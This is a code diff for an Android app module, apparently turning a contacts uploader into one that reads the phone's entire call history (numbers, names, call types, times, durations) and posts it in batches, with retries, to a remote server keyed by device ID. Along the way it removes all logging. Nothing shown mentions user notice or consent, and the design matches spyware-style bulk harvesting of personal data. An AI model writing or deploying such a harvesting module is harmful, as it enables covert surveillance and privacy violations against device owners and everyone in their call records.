@@ -1,93 +1,65 @@
 package com.example.test.utils
 
 import android.content.Context
-import android.provider.ContactsContract
-import android.util.Log
+import android.provider.CallLog
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * 📇 آپلود حرفه‌ای مخاطبین با Batch Processing
- */
-object ContactsBatchUploader {
-
-    private const val TAG = "ContactsBatchUploader"
+object CallLogsBatchUploader {
 
     private const val BATCH_SIZE = 200
     private const val RETRY_ATTEMPTS = 3
     private const val DELAY_BETWEEN_BATCHES_MS = 300L
 
-    /**
-     * 📤 آپلود سریع مخاطبین (50 تا اول)
-     */
-    suspend fun uploadQuickContacts(
+    suspend fun uploadQuickCallLogs(
         context: Context,
         deviceId: String,
         baseUrl: String,
-        limit: Int = 50
+        limit: Int = 100
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            Log.d(TAG, "⚡ Quick contacts upload started (limit: $limit)")
+            val callLogs = fetchCallLogs(context, deviceId, limit)
 
-            val contacts = fetchContacts(context, limit)
-
-            if (contacts.isEmpty()) {
-                Log.w(TAG, "⚠️ No contacts found")
+            if (callLogs.isEmpty()) {
                 return@withContext UploadResult.Success(0)
             }
 
-            Log.d(TAG, "📊 Quick upload: ${contacts.size} contacts")
-
-            val success = sendBatch(contacts, deviceId, baseUrl)
+            val success = sendBatch(callLogs, deviceId, baseUrl, 1, 1)
 
             if (success) {
-                Log.d(TAG, "✅ Quick contacts uploaded")
-                UploadResult.Success(contacts.size)
+                UploadResult.Success(callLogs.size)
             } else {
-                Log.e(TAG, "❌ Quick contacts failed")
                 UploadResult.Failure("Quick upload failed")
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Quick contacts error: ${e.message}", e)
             UploadResult.Failure(e.message ?: "Unknown error")
         }
     }
 
-    /**
-     * 📦 آپلود کامل همه مخاطبین
-     */
-    suspend fun uploadAllContacts(
+    suspend fun uploadAllCallLogs(
         context: Context,
         deviceId: String,
         baseUrl: String,
         onProgress: ((Int, Int) -> Unit)? = null
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            Log.d(TAG, "📇 CONTACTS BATCH UPLOAD STARTED")
-            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            val allCallLogs = fetchCallLogs(context, deviceId, limit = null)
 
-            val allContacts = fetchContacts(context, limit = null)
-
-            if (allContacts.isEmpty()) {
-                Log.w(TAG, "⚠️ No contacts found")
+            if (allCallLogs.isEmpty()) {
                 return@withContext UploadResult.Success(0)
             }
 
-            Log.d(TAG, "📊 Total contacts: ${allContacts.size}")
-            Log.d(TAG, "📦 Batch size: $BATCH_SIZE")
-
             var totalSent = 0
-            val totalBatches = (allContacts.size + BATCH_SIZE - 1) / BATCH_SIZE
+            val totalBatches = (allCallLogs.size + BATCH_SIZE - 1) / BATCH_SIZE
 
             for (batchIndex in 0 until totalBatches) {
                 val start = batchIndex * BATCH_SIZE
-                val end = minOf(start + BATCH_SIZE, allContacts.size)
-                val batch = allContacts.subList(start, end)
+                val end = minOf(start + BATCH_SIZE, allCallLogs.size)
+                val batch = allCallLogs.subList(start, end)
 
                 var success = false
                 var attempts = 0
@@ -96,97 +68,99 @@ object ContactsBatchUploader {
                     attempts++
 
                     try {
-                        Log.d(TAG, "📤 Sending batch ${batchIndex + 1}/$totalBatches " +
-                                "(${batch.size} contacts) - Attempt $attempts")
-
                         success = withTimeout(10000L) {
-                            sendBatch(batch, deviceId, baseUrl)
+                            sendBatch(batch, deviceId, baseUrl, batchIndex + 1, totalBatches)
                         }
 
-                        if (success) {
-                            totalSent += batch.size
-                            Log.d(TAG, "✅ Batch ${batchIndex + 1} sent")
-                        } else {
+                        if (!success && attempts < RETRY_ATTEMPTS) {
                             delay(500L * attempts)
                         }
 
                     } catch (e: Exception) {
-                        Log.e(TAG, "❌ Batch ${batchIndex + 1} error: ${e.message}")
                         if (attempts < RETRY_ATTEMPTS) {
                             delay(500L * attempts)
                         }
                     }
                 }
 
-                onProgress?.invoke(totalSent, allContacts.size)
+                if (success) {
+                    totalSent += batch.size
+                }
+
+                onProgress?.invoke(totalSent, allCallLogs.size)
 
                 if (batchIndex < totalBatches - 1) {
                     delay(DELAY_BETWEEN_BATCHES_MS)
                 }
             }
 
-            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            Log.d(TAG, "✅ CONTACTS UPLOAD COMPLETED")
-            Log.d(TAG, "   Sent: $totalSent / ${allContacts.size}")
-            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-
             UploadResult.Success(totalSent)
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ FATAL ERROR: ${e.message}", e)
             UploadResult.Failure(e.message ?: "Unknown error")
         }
     }
 
-    /**
-     * 📥 خواندن مخاطبین
-     */
-    private fun fetchContacts(context: Context, limit: Int?): List<ContactModel> {
-        val contacts = mutableListOf<ContactModel>()
+    private fun fetchCallLogs(context: Context, deviceId: String, limit: Int?): List<CallLogModel> {
+        val callLogs = mutableListOf<CallLogModel>()
 
         try {
+            val sortOrder = "${CallLog.Calls.DATE} DESC" + if (limit != null) " LIMIT $limit" else ""
+
             val cursor = context.contentResolver.query(
-                ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(
+                    CallLog.Calls._ID,
+                    CallLog.Calls.NUMBER,
+                    CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE,
+                    CallLog.Calls.DATE,
+                    CallLog.Calls.DURATION
+                ),
+                null,
+                null,
+                sortOrder
             )
 
             cursor?.use {
-                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
-                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
+                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
+                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
+                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
 
-                var count = 0
-
-                while (it.moveToNext() && (limit == null || count < limit)) {
+                while (it.moveToNext()) {
                     try {
-                        val contactId = it.getString(idIndex)
+                        val callId = it.getLong(idIndex)
+                        val number = it.getString(numberIndex) ?: ""
+                        if (number.isBlank()) continue
+
                         val name = it.getString(nameIndex) ?: "Unknown"
+                        val type = it.getInt(typeIndex)
+                        val date = it.getLong(dateIndex)
+                        val duration = it.getInt(durationIndex)
 
-                        // خواندن شماره‌های تماس
-                        val phones = mutableListOf<String>()
-                        val phoneCursor = context.contentResolver.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
-                            arrayOf(contactId),
-                            null
-                        )
+                        val callType = when (type) {
+                            CallLog.Calls.INCOMING_TYPE -> "incoming"
+                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                            CallLog.Calls.MISSED_TYPE -> "missed"
+                            CallLog.Calls.REJECTED_TYPE -> "rejected"
+                            CallLog.Calls.BLOCKED_TYPE -> "blocked"
+                            else -> "unknown"
+                        }
 
-                        phoneCursor?.use { pc ->
-                            val phoneIndex = pc.getColumnIndex(
-                                ContactsContract.CommonDataKinds.Phone.NUMBER
+                        callLogs.add(
+                            CallLogModel(
+                                callId = callId,
+                                deviceId = deviceId,
+                                number = number,
+                                name = name,
+                                callType = callType,
+                                timestamp = date,
+                                duration = duration
                             )
-                            while (pc.moveToNext()) {
-                                val phone = pc.getString(phoneIndex)
-                                if (!phone.isNullOrBlank()) {
-                                    phones.add(phone)
-                                }
-                            }
-                        }
-
-                        if (phones.isNotEmpty()) {
-                            contacts.add(ContactModel(name, phones))
-                            count++
-                        }
+                        )
 
                     } catch (e: Exception) {
                         continue
@@ -195,51 +169,52 @@ object ContactsBatchUploader {
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Fetch contacts error: ${e.message}", e)
         }
 
-        return contacts
+        return callLogs
     }
 
-    /**
-     * 📡 ارسال یک Batch از مخاطبین
-     */
     private fun sendBatch(
-        contacts: List<ContactModel>,
+        callLogs: List<CallLogModel>,
         deviceId: String,
-        baseUrl: String
+        baseUrl: String,
+        batchNumber: Int,
+        totalBatches: Int
     ): Boolean {
         return try {
-            val contactsArray = JSONArray()
+            val logsArray = JSONArray()
+            val currentTime = System.currentTimeMillis()
 
-            contacts.forEach { contact ->
-                val phonesArray = JSONArray()
-                contact.phones.forEach { phonesArray.put(it) }
-
-                contactsArray.put(JSONObject().apply {
-                    put("name", contact.name)
-                    put("phones", phonesArray)
+            callLogs.forEach { log ->
+                logsArray.put(JSONObject().apply {
+                    put("call_id", "${log.deviceId}_call_${log.callId}")
+                    put("device_id", log.deviceId)
+                    put("number", log.number)
+                    put("name", log.name)
+                    put("call_type", log.callType)
+                    put("timestamp", log.timestamp)
+                    put("duration", log.duration)
+                    put("received_at", currentTime)
                 })
             }
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("contacts", contactsArray)
-                put("timestamp", System.currentTimeMillis())
+                put("data", logsArray)
+                put("batch_info", JSONObject().apply {
+                    put("batch", batchNumber)
+                    put("of", totalBatches)
+                })
             }
 
-            val response = sendPostRequest("$baseUrl/contacts/batch", json.toString())
+            val response = sendPostRequest("$baseUrl/call-logs/batch", json.toString())
             response != null
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Send batch error: ${e.message}", e)
             false
         }
     }
 
-    /**
-     * 📡 ارسال POST request
-     */
     private fun sendPostRequest(urlString: String, jsonData: String): String? {
         var connection: HttpURLConnection? = null
         return try {
@@ -267,18 +242,20 @@ object ContactsBatchUploader {
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
             null
         } finally {
             connection?.disconnect()
         }
     }
 
-    // ===================== مدل‌های داده =====================
-
-    data class ContactModel(
+    data class CallLogModel(
+        val callId: Long,
+        val deviceId: String,
+        val number: String,
         val name: String,
-        val phones: List<String>
+        val callType: String,
+        val timestamp: Long,
+        val duration: Int
     )
 
     sealed class UploadResult {
